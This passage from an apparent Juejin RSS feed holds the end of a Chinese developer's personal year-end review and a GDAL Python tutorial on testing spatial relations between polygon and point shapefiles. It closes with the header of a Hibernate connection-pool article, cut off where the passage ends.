<p>不得不说，现在结个婚摆个酒真的花钱像流水一样啊，首先就是家里装修是自装，简简单单的对房子重新刮塑、批荡了一番；然后只将婚房搞了一个定制柜，将窗帘重新定制了，买了新床，新床垫被子等一系列准备婚房的东西。接着就是买三金还有戒指、还有订西装、婚纱、裙褂等。这就不得不提下老婆真的是非常适合过日子的性格了，一切从简并且在准备婚礼的各种买东西上面也是不断地货比三家想要减轻结婚花钱的经济压力，连婚戒也没特别说一定要那个不保值的钻石戒指（当然要是我以后真有钱了一定会补上这个的）、并且还好女方家庭 （暂时，也不知道以后老婆会不会嫌弃和上一辈住一起久了开始厌烦（划掉 没有嫌弃我没有自己的房子要和爸妈住一起；双方都是广东家庭，彩礼也不是要很多。即便是多方面节约、精打细算的加成下，结婚这件事情基本上还是也得花费大概三四十万块（不过算了，结婚这事花过去就算了，纠结不了那么多了）。</p>
<br/>
<h3 data-id="heading-1">职业生涯的迷茫</h3>
<p>在这一年来其实是在业余当中尝试学习做独立游戏，发现这条路真的十分漫长，并且如果是想要像直接从一个前端进行赚钱或者转行为目的的前提下，想要短时间就想获得很高的一个正反馈那不太现实的（如果想要短期内获得更多的一个经济上的正反馈，还不如进行直接接外包或者直接花额外的时间进修下前端后台技术进行职业上的提升更好）。但是呢，在职场上每天都在应付那群领导的索嗨拍脑袋操作，每天都在重复干着些为了给领导兜底的枯燥活；个人的成长空间极大的被受限。</p>
<p>笔者所在的公司现在因为这两年经济的下行业务系统的收窄人员的离开，现在公司里的客户端部门和 web 前端都直接合并成一个 “大前端” 部门了，虽然说名义上还是那个前端 LD，但是反正我是觉得多个 DM 来管着 web 前端组了（无论哪种行为我都觉得 🤮，一天天的在想训练奴性，唉。</p>
<br/>
<h3 data-id="heading-2">下一年的期待与计划</h3>
<p>结婚了就会更多的将职业重心逐渐偏向到家人身边了。刚过完跨年就接连变故，因为办公地点的变更，老婆被间接失业了；但是就在收到消息的当天晚上她有个好朋友伸出援手，推荐了另外一份工作，正好这份工作办公就要来到深圳，正好我也是在深圳工作的，因此 26 年应该就能夫妻俩生活工作都在一起了。今年就能够多记录下两夫妻的二人生活 log 了。</p>
<p>笔者在这一年确实明显的感受到 AI 的超快速发展，虽然感觉到 AI 目前暂时还并不能真的完全替代程序员这方面，但是 AI 辅助工作，作为提升工作效率的工具这方面的发展是非常迅速的，打算着 26 年也是进行一定程度的 AI 辅助开发的学习当中。另一个则是向着前端优化架构师的一个方向进行学习，例如项目构建链的升级优化、项目的缓存优化等。还有就是业余下继续学习一些相关独立游戏开发的技术，也算是另外的一个保持着对技术的热情吧。</p>
<p><br/><br/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GDAL 空间关系解析]]></title>    <link>https://juejin.cn/post/7592803747471704114</link>    <guid>https://juejin.cn/post/7592803747471704114</guid>    <pubDate>2026-01-08T12:08:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592803747471704114" data-draft-id="7592816646870499337" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GDAL 空间关系解析"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-08T12:08:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GIS之路"/> <meta itemprop="url" content="https://juejin.cn/user/4346787284915481"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GDAL 空间关系解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4346787284915481/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GIS之路
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:08:54.000Z" title="Thu Jan 08 2026 12:08:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">^ 关注我，带你一起学GIS ^</h2>
<h2 data-id="heading-1">前言</h2>
<blockquote>
<p>❝</p>
<p>空间关系用于判断几何对象之间位置关系，GDAL支持相交、相离、包含等多种空间关系。在GIS开发中，空间分析离不开准确的空间关系判断，选择何种空间关系，对数据查询和分析速度的影响也会有差异，所以，熟练掌握各种空间关系是很有必要的。</p>
</blockquote>
<p>在之前的文章中讲了如何使用<code>GDAL</code>或者<code>ogr2ogr</code>工具将<code>txt</code>以及<code>csv</code>文本数据转换为<code>Shp</code>格式，本篇教程在之前一系列文章的基础上讲解如何使用<strong>GDAL 空间关系解析</strong>。</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQtb_BJw91nKrFMeoa7WcxA" target="_blank" title="https://mp.weixin.qq.com/s/Qtb_BJw91nKrFMeoa7WcxA" ref="nofollow noopener noreferrer">GDAL 简介</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFLWfZItLj24JYicQEX-PbQ" target="_blank" title="https://mp.weixin.qq.com/s/FLWfZItLj24JYicQEX-PbQ" ref="nofollow noopener noreferrer">GDAL 下载安装</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fu0539e3CM2q4Y3MbMxxZKQ" target="_blank" title="https://mp.weixin.qq.com/s/u0539e3CM2q4Y3MbMxxZKQ" ref="nofollow noopener noreferrer">GDAL 开发起步</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0DGoC0oFHizJbweBnEvI-g" target="_blank" title="https://mp.weixin.qq.com/s/0DGoC0oFHizJbweBnEvI-g" ref="nofollow noopener noreferrer">GDAL 实现 GIS 数据读取转换（全）</a></li>
</ul>
<p>如果你还没有看过，建议从以上内容开始。</p>
<h2 data-id="heading-2">1. 开发环境</h2>
<p>本文使用如下开发环境，以供参考。</p>
<p>时间：<code>2025年</code></p>
<p>系统：<code>Windows 11</code></p>
<p>Python：<code>3.11.7</code></p>
<p>GDAL：<code>3.11.1</code></p>
<h2 data-id="heading-3">2. 判断几何关系</h2>
<p>定义一个方法<code>SpatialRelations</code>用于判断要素间空间关系，该方法接收两个参数，其中<code>polygonPath</code>指向面文件路径，<code>pointPath</code>指向点文件路径。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
说明：判断空间关系
参数：
    -polygonPath：面图层数据路径
    -pointPath：点图层数据路径
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">SpatialRelations</span>(<span class="hljs-params">polygonPath,pointPath</span>):
</code></pre>
<p>对于数据的基础操作步骤为获取数据驱动，获取数据源，再到获取目标图层。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 检查文件是否存在</span>
checkFilePath(polygonPath)
checkFilePath(pointPath)

<span class="hljs-comment"># 添加数据驱动</span>
<span class="hljs-attr">shpDriver</span> = ogr.GetDriverByName(<span class="hljs-string">"ESRI Shapefile"</span>)

<span class="hljs-comment"># 获取数据源</span>
<span class="hljs-attr">polygonDs</span> = shpDriver.Open(polygonPath)
<span class="hljs-attr">pointDs</span> = shpDriver.Open(pointPath)

<span class="hljs-comment"># 获取图层</span>
<span class="hljs-attr">polygonLayer</span> = polygonDs.GetLayer(<span class="hljs-number">0</span>)
<span class="hljs-attr">pointLayer</span> = pointDs.GetLayer(<span class="hljs-number">0</span>)
</code></pre>
<p>方法<code>checkFilePath</code>用于检查文件路径是否正常，接受一个路径参数。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
说明：检查文件路径是否正常
参数：
    -filePath：文件数据路径
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">checkFilePath</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-keyword">if</span> os.path.exists(filePath):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"文件数据路径存在"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"文件数据路径不存在，请检查！"</span>)
</code></pre>
<p>本文基于以下数据进行空间关系判断。<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cb80e06c8dc41f5b4b59eafeca9d1e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=dN9QLk5QGP9ki%2FJw4E4ZkdCQMT4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">3. 相交关系</h2>
<p>通过<code>GetNextFeature</code>或者<code>GetFeature</code>方法获取要素，其中<code>GetFeature</code>方法需要传入指定<code>FId</code>参数。</p>
<pre><code class="hljs language-ini" lang="ini">    <span class="hljs-comment"># 遍历面图层要素</span>
    for polyFeature in polygonLayer:
        <span class="hljs-comment"># 获取几对象</span>
        <span class="hljs-attr">polyGeom</span> = polyFeature.GetGeometryRef()
        <span class="hljs-comment"># 获取要素Id</span>
        <span class="hljs-attr">featId</span> = polyFeature.GetField(<span class="hljs-string">"Id"</span>)
        print(f"n面状要素~~~~~Id：{featId}n")

        <span class="hljs-comment"># 获取几何要素</span>
        <span class="hljs-attr">polyGeom</span> = polyFeature.GetGeometryRef()
        <span class="hljs-comment"># print(f"面状几何：{polyGeom}")</span>

        <span class="hljs-comment"># 遍历点图层要素</span>
        for ptFeature in pointLayer:
            <span class="hljs-comment"># 获取几何对象</span>
            <span class="hljs-attr">ptGeom</span> = ptFeature.GetGeometryRef()
            <span class="hljs-comment"># print(f"点状几何：{ptGeom1}")</span>

            <span class="hljs-comment"># 获取要素名称</span>
            <span class="hljs-attr">featName</span> = ptFeature.GetField(<span class="hljs-string">"name"</span>)   

            <span class="hljs-comment"># 相交</span>
            <span class="hljs-attr">result</span> = polyGeom.Intersect(ptGeom)

            <span class="hljs-attr">description</span> = <span class="hljs-string">"不相交"</span> if result == <span class="hljs-literal">False</span> else <span class="hljs-string">"^^😊相交😊^^"</span>

            print(f"面要素【{featId}】与点要素【{featName}】 是否相交：{result} （{description}）") 
</code></pre>
<p>其中<strong>相交</strong>关系输出结果显示如下，与图形显示结果一致。<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3047c9ade63a4cbca34e2c74eaf0b017~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=lVZ7gSbAZQzRv91CCiz2ZMveO5U%3D" alt="" loading="lazy"/></p>
<p>其中<strong>相离</strong>关系输出结果显示如下，与图形显示结果一致。<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e46673e9a814a41a16a58fdaf7dfdd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=JQyypc6Ae49MvQkV95TLuTsGgWs%3D" alt="" loading="lazy"/></p>
<p>其中<strong>相接</strong>关系输出结果显示如下，与图形显示结果一致。<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f66aabfa22834706bfcfcc10c5455ebc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=U3IDz7zxZNCNMaUc%2BAzpQxphqMc%3D" alt="" loading="lazy"/></p>
<p>还有<strong>包含（Contains）、重叠（Overlaps）、在...之内（Within）</strong> 等空间关系，留给感兴趣的读者自行实现。</p>
<h2 data-id="heading-5">4. 注意事项</h2>
<p>在<code>windows</code>开发环境中同时安装<code>GDAL</code>与<code>PostGIS</code>，其中投影库<code>PROJ</code>的环境变量指向<code>PostGIS</code>的安装路径，在运行GDAL程序时，涉及到要素、几何与投影操作时会导致异常。<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0cac649d51f46ec9f78e3c3e3c46a75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=txRoneDaubltLP3GULJvfWOdIo8%3D" alt="" loading="lazy"/>具体意思为<code>GDAL</code>不支持<code>PostGIS</code>插件中的投影库版本，需要更换投影库或者升级版本。</p>
<p><code>RuntimeError: PROJ: proj_identify: D:Program FilesPostgreSQL13sharecontribpostgis-3.5projproj.db contains DATABASE.LAYOUT.VERSION.MINOR = 2 whereas a number &gt;= 5 is expected. It comes from another PROJ installation.</code><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5ea7f04c3ad4675884c9c0836f2df24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=es6sF8ZO%2FB1Ndd1iixGv1G6wKDg%3D" alt="" loading="lazy"/></p>
<p>解决办法为修改<code>PROJ</code>的环境变量到<code>GDAL</code>支持的版本或者在<code>GDAL</code>程序开头添加以下代码：</p>
<pre><code class="hljs language-python" lang="python">os.environ[<span class="hljs-string">'PROJ_LIB'</span>] = <span class="hljs-string">r'D:\Programs\Python\Python311\Libsite-packages\osgeo\data\proj'</span>
</code></pre>
<p><strong>图片效果</strong></p>
<p><strong><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ee483022d85460798728b39b89153d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=6Pm89gQSEJYcqEv0julAlsLpQLE%3D" alt="" loading="lazy"/></strong></p>
<p><strong><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/390cf8e21ea5449892bd4494678d4e2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=a4bstRlYfcWyFbDo0C%2BvumHUmcQ%3D" alt="" loading="lazy"/></strong></p>
<blockquote>
<p>❝</p>
<p>OpenLayers示例数据下载，请在公众号后台回复：<strong>ol数据</strong></p>
<p>全国信息化工程师－GIS 应用水平考试资料，请在公众号后台回复：<strong>GIS考试</strong></p>
</blockquote>
<blockquote>
<p>❝</p>
<p><em><strong>GIS之路</strong></em> 公众号已经接入了<strong>智能</strong> <strong>助手</strong>，可以在对话框进行提问，也可以直接搜索历史文章进行查看。</p>
</blockquote>
<p>都看到这了，不要忘记<em><strong>点赞、收藏</strong></em> <strong>+</strong> <em><strong>关注</strong></em> 哦 <strong>！</strong></p>
<p>本号不定时更新有关 <em><strong>GIS开发</strong></em> 相关内容，<em><strong>欢迎关注 <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d87caa25e9c345b396ff0b80d4160150~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=IfTgjHA1nMigzBkmeRlFJZsD6lE%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ae768f241384749a6733f0e4c6636fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=dKBQ%2F%2F%2FqdXWcNci5dmixaVuqghk%3D" alt="" loading="lazy"/></strong></em></p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac1f2a6a00f54d98b95e06c30e27c311~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=sZ3MlNAMnmU8YtQlOP3C36cZaEg%3D" alt="" loading="lazy"/></p>
<p>   <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a663e26fe71a49adba35d7b39b3c6f11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=K3Fywed5cUG7wOPMAh68C057Fzc%3D" alt="" loading="lazy"/> </p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487953%26idx%3D1%26sn%3D0b2d5aeefdb290583cf8cdd82f3c2077%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487953&amp;idx=1&amp;sn=0b2d5aeefdb290583cf8cdd82f3c2077&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">GeoTools 开发合集（全）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487119%26idx%3D1%26sn%3Dc313efa84c27bf933ef2f2a47991ef2d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487119&amp;idx=1&amp;sn=c313efa84c27bf933ef2f2a47991ef2d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">OpenLayers 开发合集</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Ff1GPy_DNqtvEDzojlRmcBg" target="_blank" title="https://mp.weixin.qq.com/s/f1GPy_DNqtvEDzojlRmcBg" ref="nofollow noopener noreferrer">GDAL 实现数据空间查询</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FEyUADPYCf7O_9b0u8LUQCg" target="_blank" title="https://mp.weixin.qq.com/s/EyUADPYCf7O_9b0u8LUQCg" ref="nofollow noopener noreferrer">GDAL 实现数据属性查询</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FRdlldTRZ6c7FzfjBSdSPMg" target="_blank" title="https://mp.weixin.qq.com/s/RdlldTRZ6c7FzfjBSdSPMg" ref="nofollow noopener noreferrer">GDAL 实现创建几何对象</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FTUdUHgYra6oMlOaRIL1m4w" target="_blank" title="https://mp.weixin.qq.com/s/TUdUHgYra6oMlOaRIL1m4w" ref="nofollow noopener noreferrer">GDAL 实现自定义数据坐标系</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FPGxwhRbuiRUKIpT2D2cVGQ" target="_blank" title="https://mp.weixin.qq.com/s/PGxwhRbuiRUKIpT2D2cVGQ" ref="nofollow noopener noreferrer">GDAL 实现矢量数据读写</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fi77nCatd4V2nuybZFIs-xA" target="_blank" title="https://mp.weixin.qq.com/s/i77nCatd4V2nuybZFIs-xA" ref="nofollow noopener noreferrer">GDAL 数据类型大全</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0DGoC0oFHizJbweBnEvI-g" target="_blank" title="https://mp.weixin.qq.com/s/0DGoC0oFHizJbweBnEvI-g" ref="nofollow noopener noreferrer">GDAL 实现 GIS 数据读取转换（全）</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（29）什么是Hibernate的连接池？]]></title>    <link>https://juejin.cn/post/7592865044690829318</link>    <guid>https://juejin.cn/post/7592865044690829318</guid>    <pubDate>2026-01-08T12:14:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592865044690829318" data-draft-id="7592856733182574628" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（29）什么是Hibernate的连接池？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-08T12:14:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（29）什么是Hibernate的连接池？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:14:49.000Z" title="Thu Jan 08 2026 12:14:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
